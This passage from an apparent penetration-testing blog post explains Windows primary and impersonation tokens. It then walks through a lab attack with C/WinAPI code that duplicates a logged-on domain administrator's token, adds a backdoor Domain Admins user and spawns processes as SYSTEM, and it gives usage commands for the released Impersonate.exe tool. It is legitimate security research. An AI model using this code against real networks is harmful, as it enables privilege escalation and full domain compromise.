<p>Doing so, the operating system knows that the powershell process runs with the privileges of the Administrateur account and knows which type of actions the powershell process should be able to do or not. Since primary tokens are associated with the process we also call them “Process Tokens”.</p>



<h3 class="wp-block-heading"><strong>Non interactive logon</strong></h3>



<p>Non interactive logon is when you connect remotely to a Windows computer, for example to a remote SMB share. As you may know, the SMB service runs as the NT AUTHORITY\SYSTEM account because the service requires a lot of privileges in order to run properly. Yet, when you connect to a SMB share you do not gain NT AUTHORITY\SYSTEM privileges. Instead you only get a shell as your user. This happens because of an internal Windows mechanism called impersonation.</p>



<p>The overall idea is that when you connect to a remote service such as SMB, the service will create a new thread dedicated to your user. After that the security context of the thread will be intentionally downgraded so that it runs with the privileges of your user and not the NT AUTHORITY\SYSTEM account. To do that, the kernel will create what is called a “impersonation token” (the second type of access token) and associate it to the newly created thread.</p>



<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-13 is-layout-flex wp-block-gallery-is-layout-flex">
<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/remote_logon-1.png"><img loading="lazy" decoding="async" width="899" height="625" data-id="62027" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/remote_logon-1.png" alt="" class="wp-image-62027"></a></figure>
</figure>



<p>Since these tokens are associated to a thread, we also call them “Thread Tokens”.</p>



<h3 class="wp-block-heading"><strong>Primary token vs Impersonation token</strong></h3>



<p>We have seen that there are two types of access tokens, namely; primary token and impersonation token. There are three differences between them:</p>



<ul><li>A primary token is associated to a process while an impersonation token is associated to a thread</li><li>A primary token is obtained after authenticating interactively while an impersonation token is obtained after authenticating remotely</li></ul>



<p>But the most important point is that when you connect interactively to a computer, you submit credentials to the LSASS process and they are stored inside its memory. This is not the case when you connect remotely since it relies on a NTLM authentication (challenge-response).</p>



<p>The reason why the LSASS process stores credentials in memory is that it will allow your user to rely on the Single Sign-On mechanism. If no credentials were stored in memory then each time you would want to browse a remote SMB share you would have to submit your credentials. Considering how many times regular users connect to remote shares it would be a huge waste of time. To circumvent that, Microsoft designed the Single Sign-On mechanism. This mechanism will allow you to authenticate once, store your credentials in memory and automatically authenticate you to remote resources when you need to.</p>



<p>On the following screenshot we can see that I have a shell access on the adcs server yet I can browser the C$ share on the remote DC server without having to fill in my credentials:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/sso_smb.png"><img loading="lazy" decoding="async" width="537" height="268" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/sso_smb.png" alt="" class="wp-image-62000"></a></figure>



<p>This is because I already authenticated on the adcs server. Consequently, when I tried to list the contents of the c$ share on the remote dc.whiteflag.local server, the adcs server looked at the primary token associated to my user, checked if the linked credentials were located in the LSASS process and used them to automatically authenticate me on the remote server.</p>



<p>So we have seen that when you connect interactively credentials are stored in the memory of the LSASS process (which allows relying on the Windows Single Sign-On). A primary token is also created and associated to your user as well as your credentials. This token represents the user as well as their privileges on the system, and is stored somewhere within the Windows kernel. </p>



<p>What could possibly go wrong?</p>



<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-14 is-layout-flex wp-block-gallery-is-layout-flex">
<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/seagull.png"><img loading="lazy" decoding="async" width="601" height="305" data-id="62001" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/seagull.png" alt="" class="wp-image-62001"></a></figure>
</figure>



<h2 class="wp-block-heading">IV/ <strong>Exploitation Scenario</strong></h2>



<p>Before going further I would like to set the exploitation scenario that we will use till the end of this article. The Active Directory domain I created for this blog post is composed of two servers:</p>



<ul><li>A Windows DC 2019 (dc.whiteflag.local)</li><li>A Windows server 2019 (adcs.whiteflag.local)</li></ul>



<p>While doing our internal assessment we successfully pwned the adcs.whiteflag.local server and we obtained local administrator access. Listing the connected users, we can see that there are two logged on users:</p>



<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/loggedonusers.png"><img loading="lazy" decoding="async" width="1024" height="207" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/loggedonusers-1024x207.png" alt="" class="wp-image-62002"></a></figure>



<ul><li>Our local administrator account (ADCS\Administrateur)</li><li>The WHITEFLAG/Administrateur account (domain administrator of the whiteflag.local Active Directory)</li></ul>



<p>The main objective will be to usurp the identity of the WHITEFLAG/Administrateur account in order to run commands on its behalf and thus compromise the WHITEFLAG domain:</p>



<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-15 is-layout-flex wp-block-gallery-is-layout-flex">
<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/scenario.png"><img loading="lazy" decoding="async" width="841" height="374" data-id="62003" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/scenario.png" alt="" class="wp-image-62003"></a></figure>
</figure>



<h2 class="wp-block-heading"><strong>V/ Listing and Duplicating Tokens</strong></h2>



<p>Access Tokens, as well as other Windows Objects are stored in the system and freely accessible to the users that hold enough privileges (local administrator at least or NT AUTHORITY\SYSTEM). So the first thing we’ll have to do is to write some code that is able to list all of these tokens systemwide.</p>



<p>One way of doing this is using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation" data-type="URL" data-id="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation">NtQuerySystemInformation</a> function which will allow us to retrieve specific system information. Its prototype is the following:</p>



<pre class="wp-block-code"><code>__kernel_entry NTSTATUS NtQuerySystemInformation(
  SYSTEM_INFORMATION_CLASS SystemInformationClass,  // Information you want to retrieve from the system
  PVOID                    SystemInformation,       // Structure in which to store the result of the function
  ULONG                    SystemInformationLength, // Size of the result structure
  PULONG                   ReturnLength
);</code></pre>



<p>The first argument of this function is used to specify which kind of information we are looking for. In our case we want the list of all handles located on the system so we will specify the SystemHandleInformation:</p>



<pre class="wp-block-code"><code>NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &amp;returnLenght);</code></pre>



<p>This function returns a tab of pointers (handleTableInformation) to each and every handles located on the system. Thus, with a simple for loop we are able to look at them one after another:</p>



<pre class="wp-block-code"><code>for (DWORD i = 0; i &lt; handleTableInformation-&gt;NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation-&gt;Handles[i];
}</code></pre>



<p>Now that we can loop over all these handles, we are going to check if we can acquire a handle on the process that owns this handle. The reason we are doing this is because in order to manipulate a handle we need to duplicate it and in order to duplicate a handle we need to have access to the process that owns it. To open processes that we do not own we will need a specific privilege called SeDebugPrivilege. Since we own a local administrator account we have this privilege. We will just have to enable it using the AdjustTokenPrivilege function.</p>



<p>Below is the code used to open a process and duplicate a handle</p>



<pre class="wp-block-code"><code>HANDLE process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.ProcessId);
if (process == INVALID_HANDLE_VALUE) {
    CloseHandle(process);
    continue;
}

DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &amp;dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)</code></pre>



<p>The dupHandle now contains the duplicated handle that we can use on our own. However we don’t know to which type of Windows’ objects this token is associated to. Thus we will have to check manually using the NtQueryObject function which returns a string (the type of object):</p>



<pre class="wp-block-code"><code>LPWSTR GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass) {
    LPWSTR data = NULL;
    DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION)malloc(dwSize);

    NTSTATUS ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &amp;dwSize);
    if ((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGTH_MISMATCH)) {
        pObjectInfo = (POBJECT_NAME_INFORMATION)realloc(pObjectInfo, dwSize);
        ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &amp;dwSize);
    }
    if ((ntReturn &gt;= STATUS_SUCCESS) &amp;&amp; (pObjectInfo-&gt;Buffer != NULL)) {
        data = (LPWSTR)calloc(pObjectInfo-&gt;Length, sizeof(WCHAR));
        CopyMemory(data, pObjectInfo-&gt;Buffer, pObjectInfo-&gt;Length);
    }
    free(pObjectInfo);
    return data;
}</code></pre>



<p>Now that we are able to filter tokens handle we will check whether this is a primary token or an impersonation token, who created this token and to whom it is associated. To do so we can use the GetObjectInformation function:</p>



<pre class="wp-block-code"><code>BOOL GetTokenInformation(
    HANDLE                  TokenHandle,            // Handle of the token
    TOKEN_INFORMATION_CLASS TokenInformationClass,  // The type of information we are looking for
    LPVOID                  TokenInformation,       // The structure in which to store the result
    DWORD                   TokenInformationLength, // The size of the structure
    PDWORD                  ReturnLength
);</code></pre>



<p>For example if you want to find the name of the owner of the token you can use the following code:</p>



<pre class="wp-block-code"><code>GetTokenInformation(TOKEN_INFO-&gt;token_handle, TokenOwner, TokenStatisticsInformation, token_info, &amp;token_info)</code></pre>



<p>And you can do that for pretty much all the information we need. The entire code that will allow you listing all tokens on the system can be found <a href="https://github.com/sensepost/impersonate/blob/main/list_tokens.c" data-type="URL" data-id="https://github.com/sensepost/impersonate/blob/main/list_tokens.c">here</a>.</p>



<p>Compile the binary, launch it and here are the tokens:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/listing_tokens.png"><img loading="lazy" decoding="async" width="989" height="392" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/listing_tokens.png" alt="" class="wp-image-62004"></a></figure>



<p>So yeah, I know that the output is massive and not easily readable but every bit of information is important. Each line represents a token and contains the following information:</p>



<ul><li>A token ID, generated by the binary itself, that identifies the token (we will use that later)</li><li>The token type which indicates whether the token is a primary token or a impersonation token</li><li>The security context of the token, if the token is an impersonation token (which is why this field is empty for the primary tokens). There are four different values that indicate if the user is authenticated, if it is possible to impersonate them and how:<ul><li>SecurityAnonymous: the process cannot identify the user on the system and thus cannot impersonate them (mostly the associated thread was obtained after a non interactive logging using anonymous binds)</li><li>SecurityIdentification: the process can identify the user on the system but can not impersonate them</li><li>SecurityImpersonate: the user is authenticated and can be impersonated on the local system</li><li>SecurityDelegation: the user is authenticated and can be impersonated on the local system and on remote systems as well</li></ul></li><li>The owner of the token, who created it</li><li>The user to whom the token is associated</li></ul>



<p>Now that we can list the available tokens, we need to find a way to manipulate them. Thankfully, the Windows operating system allows us to duplicate tokens using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex" data-type="URL" data-id="https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex">DuplicateTokenEx</a> function, for which the prototype is the following:</p>



<pre class="wp-block-code"><code>BOOL DuplicateTokenEx(
  HANDLE                       hExistingToken,     // Handle to the existing token
  DWORD                        dwDesiredAccess,    // ACL on the new token
  LPSECURITY_ATTRIBUTES        lpTokenAttributes,  
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, // Security context of the token to create
  TOKEN_TYPE                   TokenType,          // Primary or impersonate token
  PHANDLE                      phNewToken          // Handle to the newly created token
);</code></pre>



<p>As you can see the function is simple, it takes an already existing token and duplicates it so that we can use it on our own:</p>



<pre class="wp-block-code"><code>HANDLE duplicated_token;
if (DuplicateTokenEx(legitimate_token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;duplicated_token) != 0) {
    printf("Successfully duplicated token\n");
}
else {
    printf("Duplication failed: %d\n", GetLastError());
}</code></pre>



<p>At this point we have a valid token that represents a user on the system. What do we do with it ? Well on a Windows system there are three ways you can impersonate a user:</p>



<ul><li>Using the ImpersonateLoggedOnUser function</li><li>Creating a new process using the CreateProcessAsUser or CreateProcessWithToken functions</li><li>Using the LogonUser function</li></ul>



<p>Since the LogonUser function requires having the credentials of the user we want to impersonate (which we don’t), we won’t use this one but the first two ones are very interesting!</p>



<h2 class="wp-block-heading"><strong>VI/ ImpersonateLoggedOnUser</strong></h2>



<p>This function is probably the most powerful one as it allows you to impersonate a user and run code on their behalf. Its prototype is very simple:</p>



<pre class="wp-block-code"><code>BOOL ImpersonateLoggedOnUser(
    HANDLE hToken // Handle of the duplicated token
);</code></pre>



<p>All we need to do is to give it a duplicated token, let’s say the duplicated token of the NT AUTHORITY\SYSTEM account, in order to run code as the NT AUTHORITY\SYSTEM account. Internally this function simply changes the token of our current thread to the one we gave it (the duplicated one). Thus we are not running code as our user anymore but as the impersonated user (NT AUTHORITY\SYSTEM). If you need to change back to your own account you will have to call the RevertToSelf function which will simply revert the token to the legitimate one. The following snippet shows how it is possible to impersonate a user and run the GetUserName function:</p>



<pre class="wp-block-code"><code>if (ImpersonateLoggedOnUser(duplicated_token) == 0) {
    printf("[!] Impersonation failed with error: %d", GetLastError());
    return 1;
}

TCHAR name[UNLEN + 1];
DWORD size = UNLEN + 1;
GetUserName((TCHAR*)name, &amp;size);
printf("Impersonating %ws\n", name);

RevertToSelf();</code></pre>



<p>As you can see, even if we launched the binary as the Administrateur account, the binary says that the impersonated user is NT AUTHORITY\SYSTEM:</p>



<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/impersonateloggedonuser_system.png"><img loading="lazy" decoding="async" width="1024" height="425" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/impersonateloggedonuser_system-1024x425.png" alt="" class="wp-image-62005"></a></figure>



<p>Note that using the ImpersonateLoggedOnUser you can usurp any user logged on the system. The only prerequisite you will need is to have the SeImpersonatePrivilege. Luckily, this privilege is always available to local administrator accounts. The consequence of this mechanism is that whatever code you run between the ImpersonateLoggedOnUser and RevertToSelf functions will run as the user you impersonated. Thus, if a domain administrator is connected on the server you could try to impersonate them as well as their privileges in order to run code on their behalf. Having such a possibility is insane since it will let you run whatever code you want as the domain administrator.</p>



<p>The easiest way to compromise the Active Directory domain would be to add a user to the domain and add this user to the domain administrator group. This can be done using two WinAPI functions:</p>



<ul><li>NetUserAdd:</li></ul>



<pre class="wp-block-code"><code>NET_API_STATUS NET_API_FUNCTION NetUserAdd(
    LPCWSTR servername, // Server on which you want to add the user
    DWORD   level, 
    LPBYTE  buf,        // Structure that holds information of the user to create
    LPDWORD parm_err    
);</code></pre>



<ul><li>NetGroupAddUser:</li></ul>



<pre class="wp-block-code"><code>NET_API_STATUS NET_API_FUNCTION NetGroupAddUser(
    LPCWSTR servername, // Server where to add the user to the groupe
    LPCWSTR GroupName,  // Name of the targeted group
    LPCWSTR username    // Username to add to the target group
);</code></pre>



<p>Here is the code used to impersonate a user, create a user on the domain and add it to a group:</p>



<pre class="wp-block-code"><code>printf("[*] Impersonating %ws", found_tokens[k].user_name);
if (ImpersonateLoggedOnUser(duplicated_token) == 0) {
    printf("[!] Impersonation failed with error: %d", GetLastError());
    return 1;
}

wchar_t* group = argv[5];
wchar_t* server = argv[6];
USER_INFO_1 ui;
LOCALGROUP_MEMBERS_INFO_3 account;
memset(&amp;ui, 0, sizeof(ui));
memset(&amp;account, 0, sizeof(account));
ui.usri1_name = argv[3];
ui.usri1_password = argv[4];
ui.usri1_priv = USER_PRIV_USER;
ui.usri1_home_dir = NULL;
ui.usri1_comment = NULL;
ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
ui.usri1_script_path = NULL;

printf("[*] Adding user %ls on %ls\n", ui.usri1_name, server);
if (NetUserAdd(server, 1, (LPBYTE)&amp;ui, NULL) != NERR_Success) {
    printf("[!] Add user failed with error: %d\n", GetLastError());
    return 1;
}

printf("[*] Adding user %ws to domain group %ws\n", ui.usri1_name, group);
if (NetGroupAddUser(server, group, ui.usri1_name) != 0) {
    printf("[!] Add user in domain %ws failed with error: %d", server, GetLastError());
    return 0;
}

RevertToSelf();</code></pre>



<p>And the result:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/pwned_user.png"><img loading="lazy" decoding="async" width="972" height="446" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/pwned_user.png" alt="" class="wp-image-62006"></a></figure>



<p>Simple yet very powerful:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/pwned_domain_admin.png"><img loading="lazy" decoding="async" width="662" height="503" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/pwned_domain_admin.png" alt="" class="wp-image-62007"></a></figure>



<p>Being able to run code is great but what if we want to run our own processes instead? Well there is a limit to the ImpersonateLoggedOnUser mechanism, which is, processes created while impersonating someone will not inherit the usurped identity as per say <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" data-type="URL" data-id="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">the Windows documentation of the CreateProcess function</a>:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/createprocess.png"><img loading="lazy" decoding="async" width="924" height="265" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/createprocess.png" alt="" class="wp-image-62008"></a></figure>



<p>Thus you will not be able to launch a new process such as nc.exe to get a reverse shell as another user. But don’t worry, there are other WinAPI functions ;).</p>



<h2 class="wp-block-heading"><strong>VII/ CreateProcessAsUserW and CreateProcessWithTokenW</strong></h2>



<p>If we take a look at the WinAPI documentation we can see that there are two functions that can be used to launch a new process from a token:</p>



<ul><li>CreateProcessAsUserW:</li></ul>



<pre class="wp-block-code"><code>BOOL CreateProcessAsUserW(
    HANDLE                hToken,               // Handle of the duplicated token
    LPCWSTR               lpApplicationName,    // Name of the binary to launch
    LPWSTR                lpCommandLine,        // Complementary parameters
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCWSTR               lpCurrentDirectory,
    LPSTARTUPINFOW        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);</code></pre>



<ul><li>CreateProcessWithTokenW:</li></ul>



<pre class="wp-block-code"><code>BOOL CreateProcessWithTokenW(
    HANDLE                hToken,               // Handle of the duplicated token
    DWORD                 dwLogonFlags,
    LPCWSTR               lpApplicationName,    // Name of the binary to launch
    LPWSTR                lpCommandLine,        // Complementary parameters
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCWSTR               lpCurrentDirectory,
    LPSTARTUPINFOW        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);</code></pre>



<p>Both of them take as the first argument a handle to a token. Can we use both these functions to launch new processes? Well yes and no. They both have pros and cons. First of all, it is not possible to use the CreateProcessAsUser if you do not hold enough privileges. To be more precise, using the CreateProcessAsUser requires having the SeTCBPrivilege which is the highest privilege of the entire Windows operating system. The only account that owns this privilege is the system itself. Following the exploitation scenario we will not be able to use this function since we are only local administrator.</p>



<p>However, we can use the CreateProcessWithTokenW function without holding particular privileges (other than being a local administrator). To begin with let’s first escalate to the NT AUTHORITY\SYSTEM account. To do so we can use the following code:</p>



<pre class="wp-block-code"><code>if (DuplicateTokenEx(found_tokens[k].token_handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;duplicated_token) != 0) {
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};
    
    printf("[*] Impersonating %ws and launching command [%ws]\n", found_tokens[k].user_name, command);
    CreateProcessWithTokenW(duplicated_token, 0, NULL, command, 0, 0, 0, &amp;si, &amp;pi);
    
    // Don't forget to close used handles
    CloseHandle(duplicated_token);
}</code></pre>



<p>Launch the binary as the local administrator, select an impersonation token associated to the NT AUTHORITY\SYSTEM account and:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/ntsystem_impersonate.png"><img loading="lazy" decoding="async" width="940" height="662" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/ntsystem_impersonate.png" alt="" class="wp-image-62009"></a></figure>



<p>Here is the NT AUTHORITY\SYSTEM shell! Should we try to usurp the WHITEFLAG/Administrateur account? Well you can try but it won’t work! See below:</p>



<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/cmd_error.png"><img loading="lazy" decoding="async" width="1024" height="574" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/cmd_error-1024x574.png" alt="" class="wp-image-62010"></a></figure>



<p>Instead of gaining a shell as WHITEFLAG/Administrateur we got a unusable black screen. So what happened here? Well this is all related to user’s sessions.</p>



<p>On the Windows operating system a <a href="https://techcommunity.microsoft.com/t5/ask-the-performance-team/sessions-desktops-and-windows-stations/ba-p/372473" data-type="URL" data-id="https://techcommunity.microsoft.com/t5/ask-the-performance-team/sessions-desktops-and-windows-stations/ba-p/372473">session consists of all the processes and other system objects that represents a single user’s logon session</a>. When you boot your computer, the first session that will be launched is called session 0. This is where all services are launched. When other users connect to the computer they all acquire their own sessions. The first user to login will have the session n°1, the second will have the session n°2 and so on. If you type the following command in a command line shell:</p>



<pre class="wp-block-code"><code>query.exe user</code></pre>



<p>You will be able to list users connected to the server as well as their session identifiers:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/listing_sessions.png"><img loading="lazy" decoding="async" width="698" height="80" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/listing_sessions.png" alt="" class="wp-image-62011"></a></figure>



<p>As you can see, session n°1 is associated to the administrator account who is connected through the console while the session id n°2 is associated to the administrator account connected through RDP.</p>



<p>When we tried to manipulate the token of the WHITEFLAG/Administrateur account, we duplicated an object from a user located in session n°2 and tried to use it in the session of the local administrator account (session n°1). However, if we take a deeper look at how the CreateProcessWithTokenW function works, we will see that this function uses the session id to spawn the graphical process. Since the stolen token has a session id that does not match our session the graphic window crashes.</p>



<p>The question that arises is: how does the kernel know to which session a token is associated? If we take a look at <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20(2022%20Update)/_TOKEN" data-type="URL" data-id="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20(2022%20Update)/_TOKEN">the structure of the Token Object</a> we can see that there is a variable called SessionId which is used to store the session id of the token:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/token_structure-1.png"><img loading="lazy" decoding="async" width="626" height="939" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/token_structure-1.png" alt="" class="wp-image-62039"></a></figure>



<p>If we can overwrite this attribute and set it to our own session id (session n°1) then we will be able to use it. So before trying to modify this value, we will first have to find the session id of our current session. This can be done using the following code:</p>



<pre class="wp-block-code"><code>DWORD current_token_session_id;
ProcessIdToSessionId(GetCurrentProcessId(), &amp;current_token_session_id);</code></pre>



<p>Once we have got the ID of our session, we’ll have to overwrite the value contained in the SessionId attribute of the duplicated token. This can be done using the SetInformationToken function:</p>



<pre class="wp-block-code"><code>SetTokenInformation(duplicated_token, TokenSessionId, &amp;current_token_session_id, sizeof(DWORD))</code></pre>



<p>However using the SetTokenInformation on a token that isn’t ours requires having the highest privilege possible, SeTCBPrivilege again. Since we gained a shell as the NT AUTHORITY\SYSTEM it is not an issue anymore but it explains why we first had to impersonate the NT AUTHORITY\SYSTEM account before bouncing to the WHITEFLAG/Administrateur account. All we need to do is to find the token of the WHITEFLAG/Administrateur account, duplicate it, change its session id to our and use the CreateProcessWithTokenW function again!</p>



<p>Well yes but no. When you use the CreateProcessWithTokenW function a new graphical window pops. If you do not have graphical access you will not be able to use the CreateProcessWithTokenW function. This is a huge problem since I need this tool to be useable through a PsExec shell which doesn’t support graphical windows obviously.</p>



<p>Are we stuck ? Eheh nope, do you remember the CreateProcessAsUserW function? I told you before that you cannot use it if you are not privileged enough. But now we are NT AUTHORITY\SYSTEM and what is great with this function is that it does not spawn any graphical window. Thus this function fills all the prerequisites we are looking for, let’s use it:</p>



<pre class="wp-block-code"><code>if (!SetTokenInformation(duplicated_token, TokenSessionId, &amp;current_token_session_id, sizeof(DWORD))) {
    printf("[!] Couldn't change token session id (error: %d)\n", GetLastError());
}
printf("[*] Impersonating %ws and launching command [%ws] via CreateProcessAsUserW\n", found_tokens[k].user_name, command);
CreateProcessAsUserW(duplicated_token, NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi);</code></pre>



<p>And here is the output of the tool:</p>



<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/domadmin_impersonate.png"><img loading="lazy" decoding="async" width="1024" height="411" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/domadmin_impersonate-1024x411.png" alt="" class="wp-image-62013"></a></figure>



<p>As you can see we were able to usurp the WHITEFLAG/Administrateur account and launch a cmd.exe process with the “/c whoami” parameter which prints the name of the usurped account. At this point we have successfully compromised the account of the domain administrator account. We won!</p>



<h2 class="wp-block-heading">VIII/ <strong>Impersonate Binary Code</strong></h2>



<p>The fully completed code of the Impersonate binary can be found on the following Github <a href="https://github.com/sensepost/impersonate/blob/main/Impersonate/Impersonate/Impersonate.cpp" data-type="URL" data-id="https://github.com/sensepost/impersonate/blob/main/Impersonate/Impersonate/Impersonate.cpp">repo</a>.</p>



<h2 class="wp-block-heading"><strong>IX/ Tool Release and How to</strong></h2>



<p>The Impersonate binary was designed so that it can be launched both on GUI (ie: RDP) and remotely (WMIExec/PsExec/WinRM). It is composed of three modules:</p>



<ul><li>list – This module will let you list tokens located on the system. The syntax is the following:</li></ul>



<pre class="wp-block-code"><code>Impersonate.exe list</code></pre>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/listdemo.png"><img loading="lazy" decoding="async" width="889" height="554" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/listdemo.png" alt="" class="wp-image-62040"></a></figure>



<ul><li>adduser – This module will allow you elevate your privileges on a Active Directory domain using the ImpersonateLoggedOnUser function. For this module to work you will need to have a NT AUTHORITY\System shell and a primary token associated to a domain administrator account on the system. The module will create a new user on the domain, set its password and add it to the Domain Admins group. Here is the syntax:</li></ul>



<pre class="wp-block-code"><code>Impersonate.exe adduser &lt;token id&gt; &lt;username&gt; &lt;password&gt; &lt;domain admin group&gt; &lt;remote DC server&gt;</code></pre>



<p>For example:</p>



<pre class="wp-block-code"><code>Impersonate.exe adduser 14 Pwn3d Pwn3d "Admins du domaine" \\dc.whiteflag.local</code></pre>



<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/domain_elevation.png"><img loading="lazy" decoding="async" width="1024" height="159" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/domain_elevation-1024x159.png" alt="" class="wp-image-62041"></a></figure>



<ul><li>exec – This module will allow you to run custom commands on the server. Here is the syntax:</li></ul>



<pre class="wp-block-code"><code>Impersonate.exe exec &lt;token id&gt; &lt;cmd&gt; </code></pre>



<p>For example:</p>



<pre class="wp-block-code"><code>Impersonate.exe exec 14 whoami</code></pre>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/domadmin_exec.png"><img loading="lazy" decoding="async" width="883" height="167" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/domadmin_exec.png" alt="" class="wp-image-62014"></a></figure>



<p>To sum up the capabilities of this tool here is a table containing the lists of actions you can execute depending on the access you have got:</p>



<figure class="wp-block-table"><table><tbody><tr><td></td><td>Useradd</td><td>Exec local admin -&gt; NT AUTHORITY\SYSTEM</td><td>Exec NT AUTHORITY\SYSTEM -&gt; domain user</td></tr><tr><td>Local / RDP</td><td>Possible</td><td>Possible</td><td>Possible</td></tr><tr><td>PsExec</td><td>Possible</td><td>Already NT AUTHORITY\SYSTEM</td><td>Possible</td></tr><tr><td>WMIExec</td><td>Possible</td><td>Impossible</td><td>Impossible</td></tr></tbody></table></figure>



<p>The reason you cannot use the exec module while being connected with a WMIExec shell is that you simply do not own the SeAssignPrimaryToken privilege which is required to assign a primary token to a newly created process:</p>



<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/wmiexec.png"><img loading="lazy" decoding="async" width="1024" height="468" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/wmiexec-1024x468.png" alt="" class="wp-image-62015"></a></figure>



